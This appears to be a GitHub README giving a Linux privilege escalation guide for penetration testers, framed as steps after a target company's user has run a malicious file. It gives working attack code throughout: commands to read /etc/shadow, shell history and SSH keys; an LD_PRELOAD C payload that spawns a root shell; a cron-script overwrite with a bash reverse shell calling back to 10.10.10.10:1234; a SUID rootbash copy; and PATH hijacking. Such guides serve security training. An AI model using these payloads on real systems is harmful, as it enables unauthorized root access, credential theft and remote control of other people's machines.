# Linux-PrivEsc-full-guide

Hi Folks! I made this repo that share the privilege escalation techniques I tend to use on Linux systems. At the moment, you will see basic stuff which works the best IRL but later I am going to add CTF specific techniques. Let's get into it!

# Enumeration

So, one of the your target company's users downloaded and executed a malicious file you happened to send them. You found credentials in clear text and connected back to the machine using SSH. What's the first thing you do? Identify where the hell are you and what you can do at this point of the engagement. For that I use the following commands:

## Some basic enumeration and easy wins
```sh
cat ~/.*history | less             # identify previously executed commands in the shell
whoami                             # enumerate the user
id                                 # enumerate the user
cat /etc/{passwd,shadow,group}     # check if we can see the stored passwords, users, groups
ls -l /etc/{shadow,passwd}         # check if we can write into the previously mentioned files
cat /etc/{passwd,group}            # same but without shadow (usually 'Permission denied')
ps aux | grep --ignore-case root   # see unusual processes and processes run by the root user
ls -l /.ssh                        # look for SSH keys, that you can download and connect back
locate "/*.ovpn"                   # identify vpn files that could help you pivot
find . -type f -iname "*vpn*"      # same just with the find command
```

## Further enumeration of the system, kernel version, errors..etc
```sh
hostname
hostname --all-{fqdns,ip-addresses}
uname --kernel-{name,release,version}
uname --all
lscpu

cat /proc/{version,issue}
cat /etc/os-release

# for modules
lsmod
lsmod | cut -d ' ' -f 1 | sort --unique

# oneliner: outputs errors(e.g the usual shadow permission denied) to file `err`
cat {/proc/{version,issue},/etc/{passwd,shadow,group,os-release}} 2>err

# to check which commands I can run as
# a super user without the password
sudo -l
```

`sudo -l` is the first thing you execute after gaining a foothold, you can have some easy wins with that. After checking the output go to https://gtfobins.github.io/ and note down, the binaries which are present on the system and can be executed with the sudo command without knowing the pass.

After executing `sudo -l` check the value of LD_PRELOAD, \
if you see something like this: `env_keep += LD_PRELOAD` - Than you can use the following little `C src` to gain root access:

### C Source code

in.c

```c
/*
 * author: An00bis
 * file: in.c
 */

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init(){
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
```

### Compilation
Usually, gcc is by default installed on most* systems.
We can compile it with `gcc -o out.elf in.c`
which takes `in.c` (our c source) 
and outputs `out.elf` (a executable) \
to run it: `./out.elf`


# Cron Jobs

Cron jobs are programs or scripts which users can schedule to run at specific times or intervals.
```
cat /etc/crontab                      # check for cron jobs
locate example.sh                     # Find from where the file executes
ls -l /usr/local/bin/example.sh       # check if the file is world-writable

#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/1234 0>&1  # Overwrite the file with this simple one-liner, open up a listening port on 1234 and wait for the call-back
```
```
cat /etc/crontab                      # check for cron jobs, look for the PATH variable

Here I will leave an example: /home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin. In this case the PATH variable is /home/user, we are going to invoke a shell here with root priviliges.

Create a file with the following content:


#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash


chmod +x /home/user/example.sh        # make the file executable and wait a minute or two
/tmp/rootbash -p                      # invoke the shell with the following command, the -p switch maintains the permission of the owner.
```
```
cat /usr/local/bin/example.sh         # check the content of a cronjob and look for wildcards (*)
```
Check gtfobins for exploitation methods and use them. You can find a lot of things, but the basic idea is that you trick the program to think that the commands thar are going to be executed are part of it's features. This way you can gain trick the binary to rain a metasploit reverse-shell, execute additional commands or to simply elevate you to root.


# Network enumeration

```sh
ifconfig   # to see network interfaces, ip addresses..etc
ip a       # alternative for ifconfig
ip -c a    # output in color
arp -a     # check to ARP table and discover additional assets on the subnet
ip neigh   # alternative for the arp command
ip route   # check the route table and discover gateways, additional IPs
netstat    # to see active connections

wireshark                                 # The network traffic analyzer - Wireshark
tcpdump -i <interface> -s 65535 -w <file> # The command-line network traffic analyzer - TCPDump
```

## Try to sniff traffic, it's less noisy and you have more data to work with during the engagement

# SUID / GUID binaries

The flags setuid and setgid are needed for tasks that require different privileges than what the user is normally granted, such as the ability to alter system files or databases to change their login password. When the setuid or setgid attributes are set on an executable file, then any users able to execute the file will automatically execute the file with the privileges of the file's owner (commonly root) and/or the file's group, depending upon the flags set. I highly suggest to you to do your research on this topic because I can't cover everything in a single gitHub post.


```sh

# Identify files where both
# the setuid and setgid flags are set
find . -perm /6000

# same just with a different command
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null

# Look for public exploits using
# Google, Exploit-db, Yandex...etc

# strace
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"          

# Use this commands on the binary to see the objects it's trying to load,
# try to overwrite objects with a reverse-shell to gain root access.

strings /usr/local/bin/example

# From the strings output check the paths,
# from where the other executables are called.
# Try to overwrite them with a simple bash shell,
# add the route to the PATH variable and execute the file.

PATH=.:$PATH /usr/local/bin/example
./example
```

# Before finishing

This is just quick overview of this topic, as you can see, most of the time we overwrite files, abuse call functions and use public exploits to elevate our priviliges but with a little creativity you can do so much more. :)

If permitted use automatization tools to not lose too much time on this part of the penetration testing process:

* https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
* https://github.com/The-Z-Labs/linux-exploit-suggester

Resources to help you understand better the privilige escalation process:

* https://www.udemy.com/course/linux-privilege-escalation/?referralCode=0B0B7AA1E52B4B7F4C06
* https://tryhackme.com/room/linuxprivescarena
* https://tryhackme.com/room/linuxprivesc
* https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md




